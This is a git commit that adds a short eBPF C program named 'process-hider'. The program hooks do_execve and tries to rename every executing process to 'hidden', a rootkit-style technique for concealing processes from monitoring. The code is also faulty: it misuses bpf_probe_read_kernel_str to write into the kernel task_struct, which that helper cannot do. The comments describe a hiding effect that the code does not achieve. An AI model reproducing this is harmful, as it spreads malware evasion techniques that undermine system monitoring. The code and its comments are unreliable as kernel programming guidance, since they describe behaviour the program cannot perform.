22eadd7faaebd62fe30abbdfb2fc0c57b1fa44e6
hhhardik07 <hardikamd288@gmail.com>
2026-07-10 17:14:15 +0530

    process hider

---
+++ scripts/process-hider.c
@@ -0,0 +1,20 @@
+#include <vmlinux.h>
+#include <bpf/bpf_helpers.h>
+#include <bpf/bpf_core_read.h>
+#include <bpf/bpf_tracing.h>
+#include "process_map.bpf.h"
+
+SEC("kprobe/do_execve")// attach to do_execve which is the kernel function called when a process executes a new program
+int bpf_prog(struct pt_regs *ctx) {
+    // getting the current task 
+    struct task_struct *task = (struct task_struct *)bpf_get_current_task();// returns a pointer to the task_struct
+    if (!task)
+        return 0;
+
+    // Modify the comm field to hide the process comm string is the name of the process 
+    bpf_probe_read_kernel_str(&task->comm, sizeof(task->comm), "hidden");//replaces the comm field with hidden
+    return 0;
+}
+
+char _license[] SEC("license") = "GPL";
+
